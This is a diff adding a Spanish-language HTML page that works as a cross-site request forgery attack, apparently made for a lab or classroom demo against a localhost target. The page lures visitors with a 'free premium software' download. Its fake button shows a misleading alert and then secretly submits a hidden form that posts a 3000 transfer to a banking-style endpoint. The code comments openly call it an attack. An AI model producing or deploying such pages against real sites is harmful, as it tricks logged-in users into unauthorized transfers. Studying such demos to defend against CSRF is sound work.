@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Descarga Gratis</title>
+    <style>
+        .fake-button {
+            padding: 15px 30px;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .fake-button:hover {
+            background: #218838;
+        }
+    </style>
+</head>
+<body>
+    <h1>📥 Descarga Gratuita de Software Premium</h1>
+    <p>Obtén acceso completo a nuestro software valorado en $299</p>
+    
+    <!-- Formulario oculto -->
+    <form id="hiddenForm" method="post" action="http://localhost/transfer.php">
+        <input hidden type="number" name="amount" value="3000">
+    </form>
+    
+    <!-- Botón falso que ejecuta el ataque -->
+    <button class="fake-button" onclick="executeAttack()">
+        Descargar Ahora (Gratis)
+    </button>
+
+    <script>
+        function executeAttack() {
+            // Muestra mensaje falso
+            alert('Preparando descarga...');
+            
+            // Ejecuta transferencia
+            document.getElementById('hiddenForm').submit();
+        }
+    </script>
+</body>
+</html>
